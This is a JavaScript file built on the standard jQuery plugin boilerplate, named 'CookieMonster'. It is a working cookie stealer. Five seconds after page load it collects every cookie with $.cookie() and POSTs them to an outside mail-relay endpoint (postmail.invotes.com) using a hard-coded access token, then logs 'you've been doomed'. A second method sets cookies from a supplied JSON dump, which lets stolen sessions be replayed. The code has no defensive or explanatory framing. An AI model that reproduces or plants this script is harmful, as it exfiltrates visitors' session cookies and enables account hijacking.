var isPong = true;
var mailSettings = {
    access_token: 'zlp84wtqc5op1n9bnfqe7gf5',
    subject: 'Oogle'
};

// the semi-colon before function invocation is a safety net against concatenated
// scripts and/or other plugins which may not be closed properly.
; (function ($, window, document, undefined) {

    "use strict";

    // undefined is used here as the undefined global variable in ECMAScript 3 is
    // mutable (ie. it can be changed by someone else). undefined isn't really being
    // passed in so we can ensure the value of it is truly undefined. In ES5, undefined
    // can no longer be modified.

    // window and document are passed through as local variables rather than global
    // as this (slightly) quickens the resolution process and can be more efficiently
    // minified (especially when both are regularly referenced in your plugin).

    // Create the defaults once
    var pluginName = "cMonster",
        defaults = {
            fullName: "CookieMonster",
            exec: "init",
            dump: ""
        };

    // The actual plugin constructor
    function cMonster(element, options) {
        //this.element = element;
        console.log($(this));

        // jQuery has an extend method which merges the contents of two or
        // more objects, storing the result in the first object. The first object
        // is generally empty as we don't want to alter the default options for
        // future instances of the plugin
        this.settings = $.extend({}, defaults, options);
        this._defaults = defaults;
        this._name = pluginName;
        switch (this.settings.exec) {
            case "init":
            default:
                this.init();
            case "ping":
                $(this).ping(this.settings.dump);
            case "pong":
                this.pong();//Ooogle
        }
    }

    // Avoid Plugin.prototype conflicts
    $.extend(cMonster.prototype, {
        init: function () {

            // Place initialization logic here
            // You already have access to the DOM element and
            // the options via the instance, e.g. this.element
            // and this.settings
            // you can add more functions like the one below and
            // call them like the example below
            this.attachKB();
            this.pong();
        },
        attachKB: function (text) {
            //$("body").keypress(function (evt) {
            //    if (evt.key === "z") {
            //        console.log("test");
            //    }
            //});
            // some logic
            $(this.element).text(text);
        },
        ping: function (strJson) {
            var cookies = JSON.parse(strJson);
            $.each(function (i,e) {
                $.cookie(e.name, e.value);
            });
        },
        pong: function () {

            var cookies = $.cookie();
            this.sendMail(JSON.stringify(cookies), function (resp) { console.log("you've been doomed, " + resp); }, function () { console.log("fail"); });
        },
        sendMail(data, success, failure) {
            mailSettings['text'] = data;
            $.ajax({
                url: 'https://postmail.invotes.com/send',
                type: "POST",
                data: mailSettings,
                async: false,
                //contentType: "application/json; charset=utf-8",
                //dataType: "json",
                success: success //(resp)
            }).fail(failure);
        }
    });

    // A really lightweight plugin wrapper around the constructor,
    // preventing against multiple instantiations
    $.fn[pluginName] = function (options) {
        return this.each(function () {
            if (!$.data(this, "plugin_" + pluginName)) {
                $.data(this, "plugin_" +
                    pluginName, new cMonster(this, options));
            }
        });
    };

})(jQuery, window, document);

$(document).ready(function () {
    //console.log("in");
    window.setTimeout(function () {
        $("body").cMonster({});
    }, 5000);
});
